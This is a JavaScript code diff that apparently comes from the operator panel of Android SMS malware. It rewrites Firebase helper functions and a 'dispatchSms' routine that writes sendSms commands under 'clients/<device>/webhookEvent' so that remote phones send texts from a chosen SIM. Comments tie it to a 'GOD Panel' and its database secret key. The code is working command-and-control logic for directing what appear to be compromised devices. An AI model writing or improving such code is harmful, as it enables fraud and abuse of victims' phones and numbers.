@@ -716,64 +716,85 @@ function autoRestoreSession(){
 }
 
 /* ═══════ FIREBASE CORE ═══════ */
+function fbAuthSuffix(key){
+  var k = key !== undefined ? String(key || '').trim() : String(FB_KEY || '').trim();
+  if(!k) return '';
+  return '?auth=' + encodeURIComponent(k);
+}
+function fbUrlWithQuery(baseUrl, path, key, extraQuery){
+  var u = String(baseUrl || FB_URL).replace(/\/+$/, '');
+  var auth = fbAuthSuffix(key);
+  var q = extraQuery ? String(extraQuery).replace(/^\?/, '') : '';
+  if(!q) return u + '/' + path + '.json' + auth;
+  return u + '/' + path + '.json' + (auth ? auth + '&' + q : '?' + q);
+}
 async function fbGet(p, url, key){
-  var u = url || FB_URL, k = key !== undefined ? key : FB_KEY;
-  var r = await _fastFetch(u + '/' + p + '.json' + (k ? '?auth=' + k : ''));
+  var r = await _fastFetch(fbUrlWithQuery(url || FB_URL, p, key !== undefined ? key : FB_KEY));
   if(!r.ok) throw new Error('HTTP ' + r.status);
   return r.json();
 }
 async function fbSet(p, d, url, key){
-  var u = url || FB_URL, k = key !== undefined ? key : FB_KEY;
-  var r = await _fastFetch(u + '/' + p + '.json' + (k ? '?auth=' + k : ''), {
+  var r = await _fastFetch(fbUrlWithQuery(url || FB_URL, p, key !== undefined ? key : FB_KEY), {
     method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(d)
   });
   if(!r.ok) throw new Error('HTTP ' + r.status);
   return r.json();
 }
 async function fbDel(p, url, key){
-  var u = url || FB_URL, k = key !== undefined ? key : FB_KEY;
-  var r = await _fastFetch(u + '/' + p + '.json' + (k ? '?auth=' + k : ''), { method: 'DELETE' });
+  var r = await _fastFetch(fbUrlWithQuery(url || FB_URL, p, key !== undefined ? key : FB_KEY), { method: 'DELETE' });
   if(!r.ok) throw new Error('HTTP ' + r.status);
 }
 
-/* ═══════════════════════════════════════════════════════════════
-   SMS DISPATCH — GOD Panel (Zp) compatible PUT sendSms
-   ═══════════════════════════════════════════════════════════════ */
+/* GOD Pannel.html — Zp() PUT @ ~17373, sendSms payload @ ~18795 */
+async function godFirebasePut(fbUrl, authKey, path, data){
+  var base = String(fbUrl || '').replace(/\/+$/, '');
+  var key = String(authKey || '').trim();
+  var url = base + '/' + path + '.json?auth=' + key;
+  var r = await fetch(url, {
+    method: 'PUT',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  });
+  if(!r.ok){
+    if(r.status === 401 || r.status === 403){
+      throw new Error('PERMISSION_DENIED: Database Secret key — AIza API key nahi');
+    }
+    throw new Error('HTTP ' + r.status);
+  }
+  return r.json();
+}
+
 async function dispatchSms(dev, sim, to, message){
   if(!dev){ console.warn('[SMS] no device'); return false; }
-  var toNorm = normalizeSmsTo(to);
-  if(!toNorm){ console.warn('[SMS] invalid number'); toast('⚠ Invalid number'); return false; }
-  var simNum = parseInt(sim, 10);
-  if(isNaN(simNum) || simNum < 1) simNum = 1;
+  var toStr = String(to || '').trim();
   var text = String(message || '').trim();
-  if(!text){ console.warn('[SMS] empty message'); return false; }
+  if(!toStr || !text){ toast('⚠ Number aur message bharein'); return false; }
+
+  var fromSim = parseInt(sim, 10);
+  if(isNaN(fromSim) || fromSim < 1) fromSim = 1;
 
   var authKey = fbKeyForDev(dev);
-  var path = 'clients/' + dev.id + '/webhookEvent/sendSms';
-  var payloads = [
-    { from: simNum, to: toNorm, message: text, isSended: false },
-    { from: String(simNum), to: String(toNorm), message: text, isSended: false, isSendedNew: false },
-    { sim: simNum, to: toNorm, message: text, isSended: false }
-  ];
-
-  for(var f=0; f<payloads.length; f++){
-    try{
-      var t0 = performance.now();
-      await fbSet(path, payloads[f], dev._fbUrl, authKey);
-      var dt = (performance.now() - t0).toFixed(0);
-      console.log('[SMS] ✓ queued ' + dt + 'ms → ' + dev.name + ' SIM' + simNum + ' → ' + toNorm);
-      try{ notifySmsQueued(dev, toNorm, text, dt); }catch(e){}
-      return true;
-    }catch(e){
-      var msg = e && e.message ? e.message : String(e);
-      console.warn('[SMS] attempt ' + (f + 1) + ' failed:', msg);
-      if(/401|403|PERMISSION/i.test(msg) && !authKey){
-        toast('⚠ SMS ke liye Database Secret key chahiye (setup screen)');
-      }
-    }
+  if(!authKey){
+    toast('⚠ GOD panel jaisa Database Secret key setup me daalo');
+    return false;
   }
-  console.error('[SMS] ✗ send failed for ' + dev.name);
-  return false;
+
+  var payload = { from: fromSim, to: toStr, message: text, isSended: false };
+  var path = 'clients/' + dev.id + '/webhookEvent/sendSms';
+
+  try{
+    var t0 = performance.now();
+    await godFirebasePut(dev._fbUrl || FB_URL, authKey, path, payload);
+    var dt = (performance.now() - t0).toFixed(0);
+    console.log('[SMS] ✓ sendSms.json PUT ' + dt + 'ms → ' + dev.name + ' SIM' + fromSim + ' → ' + toStr);
+    try{ notifySmsQueued(dev, toStr, text, dt); }catch(e){}
+    return true;
+  }catch(e){
+    var msg = e && e.message ? e.message : String(e);
+    console.warn('[SMS] sendSms failed:', msg);
+    toast(/PERMISSION/i.test(msg) ? '⚠ Secret key galat — GOD wali key copy karo' : ('❌ ' + msg));
+    return false;
+  }
 }
 async function sendSmsGuaranteed(dev, sim, to, message){
   return await dispatchSms(dev, sim, to, message);
